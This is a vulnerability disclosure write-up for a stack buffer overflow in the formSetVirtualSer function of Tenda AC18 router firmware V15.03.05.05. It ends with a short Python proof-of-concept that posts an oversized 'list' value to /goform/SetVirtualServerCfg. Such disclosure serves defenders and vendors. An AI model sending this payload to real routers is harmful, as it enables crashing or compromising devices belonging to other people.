## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetVirtualSer` function. The `v5` variable receives the `list` parameter from a POST request and is assigned to function `sub_75F48` as `a2`. However, since the user can control the input of `list`, the statement `sscanf(v17, "%[^,]%*c%[^,]%*c%[^,]%*c%s", v12, v11, v10, v9) == 4` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `v9~v12` array, triggering this security vulnerability.

![image-20240318115253822](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318115253822.png)

![image-20240318120158970](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318120158970.png)

![image-20240318120149133](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318120149133.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetVirtualServerCfg"
payload = b"a"*2000

data = {
        'list':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316221759943](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316221759943.png)
